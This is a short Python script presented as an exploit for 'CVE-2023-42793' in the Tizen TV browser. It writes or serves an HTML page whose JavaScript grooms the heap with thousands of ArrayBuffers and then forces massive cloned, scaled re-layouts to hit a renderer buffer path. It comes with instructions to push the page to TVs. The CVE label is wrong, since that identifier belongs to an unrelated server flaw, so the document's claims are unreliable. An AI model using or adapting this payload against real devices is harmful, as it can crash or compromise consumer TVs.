#!/usr/bin/env python3
"""CVE-2023-42793 — Tizen Browser. HTML page exercising the renderer.
Serve it and open on the TV browser; or push via the Tizen web app channel."""
import sys, http.server, socketserver
from pathlib import Path

HTML = b"""<!doctype html><html><head><meta charset=utf-8></head><body>
<script>
// heap-groom then force a large re-layout to hit the browser's buffer path
var a=[]; for(var i=0;i<4096;i++){a.push(new ArrayBuffer(0x1000));}
var d=document.createElement('div');
d.style.cssText='width:999999px;height:999999px;position:absolute';
document.body.appendChild(d);
for(var i=0;i<64;i++){var c=d.cloneNode();c.style.transform='scale('+(i+1)+')';document.body.appendChild(c);}
</script></body></html>"""

def build() -> bytes:
    return HTML

def serve(port=8000):
    Path("cve-2023-42793.html").write_bytes(HTML)
    h = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("0.0.0.0", port), h) as srv:
        print(f"[+] serving http://0.0.0.0:{port}/cve-2023-42793.html")
        srv.serve_forever()

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--serve":
        serve()
    else:
        Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2023-42793.html").write_bytes(build())
        print("[+] CVE-2023-42793 HTML payload written")

if __name__ == "__main__":
    main()
